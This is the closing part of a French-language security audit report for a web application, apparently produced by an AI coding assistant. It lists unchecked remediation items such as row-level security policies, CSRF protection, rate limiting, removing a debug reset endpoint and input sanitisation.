- [ ] RLS activé sur toutes les tables
- [ ] Toutes les politiques RLS créées et testées
- [ ] Protection CSRF active
- [ ] Middleware protège toutes les routes sensibles
- [ ] Endpoint `/debug/reset` supprimé ou protégé
- [ ] Vérification destinataire corrigée
- [ ] Rate limiting sur endpoints publics
- [ ] Entrées utilisateur sanitisées
- [ ] Codes promo en base de données
- [ ] Endpoint emails protégé par secret
- [ ] Monitoring et alertes configurés
- [ ] Tests de sécurité automatisés en CI/CD
- [ ] Documentation mise à jour
- [ ] Audit de sécurité professionnel réalisé

---

**Rapport généré le:** 2025-11-27
**Analysé par:** Claude Code (Sonnet 4.5)
**Dernière mise à jour:** 2025-11-27
